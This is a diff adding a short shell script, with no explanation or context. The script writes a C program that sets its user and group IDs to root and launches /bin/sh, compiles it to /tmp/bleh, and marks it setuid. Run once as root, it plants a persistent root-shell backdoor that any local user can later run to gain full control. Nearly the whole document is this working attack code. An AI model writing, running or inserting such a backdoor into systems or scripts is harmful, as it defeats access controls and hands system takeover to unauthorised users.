@@ -1,0 +1,24 @@
+#!/bin/sh
+
+export PATH="/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin"
+
+cat << 'EOF' > /tmp/bleh.c
+#include <stdio.h>
+#include <sys/types.h>
+#include <unistd.h>
+
+int
+main (void)
+{
+	char *a[] = {"/bin/sh", NULL};
+	char *e[] = {NULL};
+
+	setuid (0);
+	setgid (0);
+	execve (a[0], a, e);
+	return 0;
+}
+EOF
+
+gcc -o /tmp/bleh /tmp/bleh.c
+chmod +s /tmp/bleh
